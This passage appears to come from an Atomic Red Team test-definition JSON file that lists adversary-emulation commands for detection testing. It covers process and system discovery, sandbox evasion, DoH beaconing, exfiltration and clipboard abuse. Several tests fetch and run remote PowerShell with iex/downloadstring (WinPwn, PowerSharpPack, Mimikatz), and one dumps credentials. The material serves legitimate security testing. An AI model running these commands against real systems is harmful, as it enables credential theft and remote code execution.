                    "name": "command_prompt"
                }
            }
        ]
    },
    {
        "attack_technique": "T1057",
        "display_name": "Process Discovery",
        "atomic_tests": [
            {
                "name": "Process Discovery - ps",
                "auto_generated_guid": "4ff64f0b-aaf2-4866-b39d-38d9791407cc",
                "description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n",
                "supported_platforms": [
                    "macos",
                    "linux"
                ],
                "input_arguments": {
                    "output_file": {
                        "description": "path of output file",
                        "type": "path",
                        "default": "/tmp/loot.txt"
                    }
                },
                "executor": {
                    "command": "ps >> #{output_file}\nps aux >> #{output_file}\n",
                    "cleanup_command": "rm #{output_file}\n",
                    "name": "sh"
                }
            },
            {
                "name": "Process Discovery - tasklist",
                "auto_generated_guid": "c5806a4f-62b8-4900-980b-c7ec004e9908",
                "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "tasklist\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Process Discovery - Get-Process",
                "auto_generated_guid": "3b3809b6-a54b-4f5b-8aff-cb51f2e97b34",
                "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "Get-Process\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Process Discovery - get-wmiObject",
                "auto_generated_guid": "b51239b4-0129-474f-a2b4-70f855b9f2c2",
                "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "get-wmiObject -class Win32_Process\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Process Discovery - wmic process",
                "auto_generated_guid": "640cbf6d-659b-498b-ba53-f6dd1a1cc02c",
                "description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "wmic process get /format:list\n",
                    "name": "command_prompt"
                }
            }
        ]
    },
    {
        "attack_technique": "T1082",
        "display_name": "System Information Discovery",
        "atomic_tests": [
            {
                "name": "System Information Discovery",
                "auto_generated_guid": "66703791-c902-4560-8770-42b8a91f7667",
                "description": "Identify System Info. Upon execution, system info and time info will be displayed.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "System Information Discovery",
                "auto_generated_guid": "edff98ec-0f73-4f63-9890-6b117092aff6",
                "description": "Identify System Info\n",
                "supported_platforms": [
                    "macos"
                ],
                "executor": {
                    "command": "system_profiler\nls -al /Applications\n",
                    "name": "sh"
                }
            },
            {
                "name": "List OS Information",
                "auto_generated_guid": "cccb070c-df86-4216-a5bc-9fb60c74e27c",
                "description": "Identify System Info\n",
                "supported_platforms": [
                    "linux",
                    "macos"
                ],
                "input_arguments": {
                    "output_file": {
                        "description": "Output file used to store the results.",
                        "type": "Path",
                        "default": "/tmp/T1082.txt"
                    }
                },
                "executor": {
                    "command": "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi\nuptime >> #{output_file}\ncat #{output_file} 2>/dev/null\n",
                    "cleanup_command": "rm #{output_file} 2>/dev/null\n",
                    "name": "sh"
                }
            },
            {
                "name": "Linux VM Check via Hardware",
                "auto_generated_guid": "31dad7ad-2286-4c02-ae92-274418c85fec",
                "description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n",
                "supported_platforms": [
                    "linux"
                ],
                "executor": {
                    "command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi\n",
                    "name": "bash"
                }
            },
            {
                "name": "Linux VM Check via Kernel Modules",
                "auto_generated_guid": "8057d484-0fae-49a4-8302-4812c4f1e64e",
                "description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n",
                "supported_platforms": [
                    "linux"
                ],
                "executor": {
                    "command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n",
                    "name": "bash"
                }
            },
            {
                "name": "Hostname Discovery (Windows)",
                "auto_generated_guid": "85cfbf23-4a1e-4342-8792-007e004b975f",
                "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "hostname\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Hostname Discovery",
                "auto_generated_guid": "486e88ea-4f56-470f-9b57-3f4d73f39133",
                "description": "Identify system hostname for Linux and macOS systems.\n",
                "supported_platforms": [
                    "linux",
                    "macos"
                ],
                "executor": {
                    "command": "hostname\n",
                    "name": "bash"
                }
            },
            {
                "name": "Windows MachineGUID Discovery",
                "auto_generated_guid": "224b4daf-db44-404e-b6b2-f4d1f0126ef8",
                "description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Griffon Recon",
                "auto_generated_guid": "69bd4abe-8759-49a6-8d21-0f15822d6370",
                "description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "vbscript": {
                        "description": "Path to sample script",
                        "type": "String",
                        "default": "PathToAtomicsFolder\\T1082\\src\\griffon_recon.vbs"
                    }
                },
                "executor": {
                    "command": "cscript #{vbscript}",
                    "name": "powershell",
                    "elevation_required": false
                }
            },
            {
                "name": "Environment variables discovery on windows",
                "auto_generated_guid": "f400d1c0-1804-4ff8-b069-ef5ddd2adbf3",
                "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "set\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Environment variables discovery on macos and linux",
                "auto_generated_guid": "fcbdd43f-f4ad-42d5-98f3-0218097e2720",
                "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
                "supported_platforms": [
                    "macos",
                    "linux"
                ],
                "executor": {
                    "command": "env\n",
                    "name": "sh"
                }
            },
            {
                "name": "Show System Integrity Protection status (MacOS)",
                "auto_generated_guid": "327cc050-9e99-4c8e-99b5-1d15f2fb6b96",
                "description": "Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.\n",
                "supported_platforms": [
                    "macos"
                ],
                "executor": {
                    "command": "csrutil status\n",
                    "name": "sh"
                }
            },
            {
                "name": "WinPwn - winPEAS",
                "auto_generated_guid": "eea1d918-825e-47dd-acc2-814d6c58c0e1",
                "description": "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwinPEAS -noninteractive -consoleoutput",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - itm4nprivesc",
                "auto_generated_guid": "3d256a2f-5e57-4003-8eb6-64d91b1da7ce",
                "description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nitm4nprivesc -noninteractive -consoleoutput",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - Powersploits privesc checks",
                "auto_generated_guid": "345cb8e4-d2de-4011-a580-619cf5a9e2d7",
                "description": "Powersploits privesc checks using oldchecks function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\noldchecks -noninteractive -consoleoutput",
                    "cleanup_command": "rm -force -recurse .\\DomainRecon -ErrorAction Ignore\nrm -force -recurse .\\Exploitation -ErrorAction Ignore\nrm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore\nrm -force -recurse .\\LocalRecon -ErrorAction Ignore\nrm -force -recurse .\\Vulnerabilities -ErrorAction Ignore",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - General privesc checks",
                "auto_generated_guid": "5b6f39a2-6ec7-4783-a5fd-2c54a55409ed",
                "description": "General privesc checks using the otherchecks function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - GeneralRecon",
                "auto_generated_guid": "7804659b-fdbf-4cf6-b06a-c03e758590e8",
                "description": "Collect general computer informations via GeneralRecon function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - Morerecon",
                "auto_generated_guid": "3278b2f6-f733-4875-9ef4-bfed34244f0a",
                "description": "Gathers local system information using the Morerecon function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMorerecon -noninteractive -consoleoutput",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - RBCD-Check",
                "auto_generated_guid": "dec6a0d8-bcaf-4c22-9d48-2aee59fb692b",
                "description": "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nRBCD-Check -consoleoutput -noninteractive",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - PowerSharpPack - Watson searching for missing windows patches",
                "auto_generated_guid": "07b18a66-6304-47d2-bad0-ef421eb2e107",
                "description": "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')\nInvoke-watson",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors",
                "auto_generated_guid": "efb79454-1101-4224-a4d0-30c9c8b29ffc",
                "description": "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')\nInvoke-SharpUp -command \"audit\"",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - PowerSharpPack - Seatbelt",
                "auto_generated_guid": "5c16ceb4-ba3a-43d7-b848-a13c1f216d95",
                "description": "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')\nInvoke-Seatbelt -Command \"-group=all\"; pause",
                    "name": "powershell"
                }
            },
            {
                "name": "Azure Security Scan with SkyArk",
                "auto_generated_guid": "26a18d3d-f8bc-486b-9a33-d6df5d78a594",
                "description": "Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. \nOnce the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. \nSee https://github.com/cyberark/SkyArk \n",
                "supported_platforms": [
                    "azure-ad"
                ],
                "input_arguments": {
                    "username": {
                        "description": "Azure AD username",
                        "type": "String",
                        "default": null
                    },
                    "password": {
                        "description": "Azure AD password",
                        "type": "String",
                        "default": "T1082Az"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "The SkyArk AzureStealth module must exist in $env:temp.\n",
                        "prereq_command": "if (test-path $env:temp\\AzureStealth.ps1){exit 0} else {exit 1}\n",
                        "get_prereq_command": "invoke-webrequest \"https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1\" -outfile \"$env:temp\\AzureStealth.ps1\"\n"
                    },
                    {
                        "description": "The AzureAD module must be installed.\n",
                        "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
                        "get_prereq_command": "Install-Module -Name AzureAD -Force\n"
                    },
                    {
                        "description": "The Az module must be installed.\n",
                        "prereq_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
                        "get_prereq_command": "Install-Module -Name Az -Force\n"
                    }
                ],
                "executor": {
                    "command": "Import-Module $env:temp\\AzureStealth.ps1 -force      \n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential\nConnect-AzureAD -Credential $Credential\nScan-AzureAdmins -UseCurrentCred\n",
                    "cleanup_command": "$resultstime = Get-Date -Format \"yyyyMMdd\"\n$resultsfolder = (\"Results-\" + $resultstime)\nremove-item $env:temp\\$resultsfolder -recurse -force -erroraction silentlycontinue\n",
                    "name": "powershell",
                    "elevation_required": true
                }
            },
            {
                "name": "Linux List Kernel Modules",
                "auto_generated_guid": "034fe21c-3186-49dd-8d5d-128b35f181c7",
                "description": "Identify kernel modules installed. Upon successful execution stdout will display kernel modules installed on host.\n",
                "supported_platforms": [
                    "linux"
                ],
                "executor": {
                    "command": "sudo lsmod\nsudo kmod list\n",
                    "name": "sh"
                }
            }
        ]
    },
    {
        "attack_technique": "T1497.001",
        "display_name": "Virtualization/Sandbox Evasion: System Checks",
        "atomic_tests": [
            {
                "name": "Detect Virtualization Environment (Linux)",
                "auto_generated_guid": "dfbd1a21-540d-4574-9731-e852bd6fe840",
                "description": "systemd-detect-virt detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n",
                "supported_platforms": [
                    "linux"
                ],
                "executor": {
                    "name": "sh",
                    "elevation_required": true,
                    "command": "if (systemd-detect-virt || sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;\n"
                }
            },
            {
                "name": "Detect Virtualization Environment (Windows)",
                "auto_generated_guid": "502a7dc4-9d6f-4d28-abf2-f0e84692562d",
                "description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "name": "powershell",
                    "elevation_required": false,
                    "command": "$error.clear()\nGet-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue\nif($error) {echo \"Virtualization Environment detected\"}\n",
                    "cleanup_command": "$error.clear()\n"
                }
            },
            {
                "name": "Detect Virtualization Environment (MacOS)",
                "auto_generated_guid": "a960185f-aef6-4547-8350-d1ce16680d09",
                "description": "ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.\n",
                "supported_platforms": [
                    "macos"
                ],
                "executor": {
                    "name": "sh",
                    "elevation_required": false,
                    "command": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;\n"
                }
            },
            {
                "name": "Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)",
                "auto_generated_guid": "4a41089a-48e0-47aa-82cb-5b81a463bc78",
                "description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "name": "powershell",
                    "elevation_required": false,
                    "command": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"\n$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"\nif((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}\n"
                }
            }
        ]
    },
    {
        "attack_technique": "T1572",
        "display_name": "Protocol Tunneling",
        "atomic_tests": [
            {
                "name": "DNS over HTTPS Large Query Volume",
                "auto_generated_guid": "ae9ef4b0-d8c1-49d4-8758-06206f19af0a",
                "description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "doh_server": {
                        "description": "Default DoH resolver",
                        "type": "String",
                        "default": "https://8.8.8.8/resolve"
                    },
                    "query_type": {
                        "description": "DNS query type",
                        "type": "String",
                        "default": "TXT"
                    },
                    "subdomain": {
                        "description": "Subdomain prepended to the domain name",
                        "type": "String",
                        "default": "atomicredteam"
                    },
                    "query_volume": {
                        "description": "Number of DNS queries to send",
                        "type": "Integer",
                        "default": "1000"
                    },
                    "domain": {
                        "description": "Default domain to simulate against",
                        "type": "String",
                        "default": "127.0.0.1.xip.io"
                    }
                },
                "executor": {
                    "command": "for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest \"#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}\" -UseBasicParsing).Content }\n",
                    "name": "powershell"
                }
            },
            {
                "name": "DNS over HTTPS Regular Beaconing",
                "auto_generated_guid": "0c5f9705-c575-42a6-9609-cbbff4b2fc9b",
                "description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "doh_server": {
                        "description": "Default DoH resolver",
                        "type": "String",
                        "default": "https://8.8.8.8/resolve"
                    },
                    "runtime": {
                        "description": "Time in minutes to run the simulation",
                        "type": "Integer",
                        "default": 30
                    },
                    "domain": {
                        "description": "Default domain to simulate against",
                        "type": "String",
                        "default": "127.0.0.1.xip.io"
                    },
                    "subdomain": {
                        "description": "Subdomain prepended to the domain name",
                        "type": "String",
                        "default": "atomicredteam"
                    },
                    "query_type": {
                        "description": "DNS query type",
                        "type": "String",
                        "default": "TXT"
                    },
                    "c2_interval": {
                        "description": "Seconds between C2 requests to the command and control server",
                        "type": "Integer",
                        "default": 30
                    },
                    "c2_jitter": {
                        "description": "Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests",
                        "type": "Integer",
                        "default": 20
                    }
                },
                "executor": {
                    "command": "Set-Location PathToAtomicsFolder\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n",
                    "name": "powershell"
                }
            },
            {
                "name": "DNS over HTTPS Long Domain Query",
                "auto_generated_guid": "748a73d5-cea4-4f34-84d8-839da5baa99c",
                "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "doh_server": {
                        "description": "Default DoH resolver",
                        "type": "String",
                        "default": "https://8.8.8.8/resolve"
                    },
                    "query_type": {
                        "description": "DNS query type",
                        "type": "String",
                        "default": "TXT"
                    },
                    "subdomain": {
                        "description": "Subdomain prepended to the domain name (should be 63 characters to test maximum length)",
                        "type": "String",
                        "default": "atomicredteamatomicredteamatomicredteamatomicredteamatomicredte"
                    },
                    "domain": {
                        "description": "Default domain to simulate against",
                        "type": "String",
                        "default": "127.0.0.1.xip.io"
                    }
                },
                "executor": {
                    "command": "Set-Location PathToAtomicsFolder\n.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n",
                    "name": "powershell"
                }
            }
        ]
    },
    {
        "attack_technique": "T1020",
        "display_name": "Automated Exfiltration",
        "atomic_tests": [
            {
                "name": "IcedID Botnet HTTP PUT",
                "auto_generated_guid": "9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0",
                "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "file": {
                        "description": "Exfiltration File",
                        "type": "String",
                        "default": "C:\\temp\\T1020_exfilFile.txt"
                    },
                    "domain": {
                        "description": "Destination Domain",
                        "type": "Url",
                        "default": "https://google.com"
                    }
                },
                "executor": {
                    "command": "$fileName = \"#{file}\"\n$url = \"#{domain}\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",
                    "cleanup_command": "$fileName = \"#{file}\"\nRemove-Item -Path $fileName -ErrorAction Ignore",
                    "name": "powershell"
                }
            }
        ]
    },
    {
        "attack_technique": "T1115",
        "display_name": "Clipboard Data",
        "atomic_tests": [
            {
                "name": "Utilize Clipboard to store or execute commands from",
                "auto_generated_guid": "0cd14633-58d4-4422-9ede-daa2c9474ae7",
                "description": "Add data to clipboard to copy off or execute commands from.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n",
                    "cleanup_command": "del %temp%\\T1115.txt >nul 2>&1\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Execute Commands from Clipboard using PowerShell",
                "auto_generated_guid": "d6dc21af-bec9-4152-be86-326b6babd416",
                "description": "Utilize PowerShell to echo a command to clipboard and execute it\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "echo Get-Process | clip\nGet-Clipboard | iex\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Execute commands from clipboard",
                "auto_generated_guid": "1ac2247f-65f8-4051-b51f-b0ccdfaaa5ff",
                "description": "Echo a command to clipboard and execute it",
                "supported_platforms": [
                    "macos"
                ],
                "executor": {
                    "command": "echo ifconfig | pbcopy\n$(pbpaste)",
                    "name": "bash"
                }
            },
            {
                "name": "Collect Clipboard Data via VBA",
                "auto_generated_guid": "9c8d5a72-9c98-48d3-b9bf-da2cc43bdf52",
                "description": "This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\atomic_T1115_clipboard_data.txt\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "ms_product": {
                        "description": "Maldoc application Word",
                        "type": "String",
                        "default": "Word"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "Microsoft #{ms_product} must be installed\n",
                        "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
                        "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
                    }
                ],
                "executor": {
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nSet-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"\n",
                    "cleanup_command": "Remove-Item \"$env:TEMP\\atomic_T1115_clipboard_data.txt\" -ErrorAction Ignore\n",
                    "name": "powershell"
                }
            }
        ]
    },
    {
        "attack_technique": "T1059.001",
        "display_name": "Command and Scripting Interpreter: PowerShell",
        "atomic_tests": [
            {
                "name": "Mimikatz",
                "auto_generated_guid": "f3132740-55bc-48c4-bcc0-758a459cd027",
                "description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "mimurl": {
                        "description": "Mimikatz url",
                        "type": "Url",
                        "default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
                    }
                },
                "executor": {
                    "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"\n",
                    "name": "command_prompt",
                    "elevation_required": true
                }
            },
            {
                "name": "Run BloodHound from local disk",
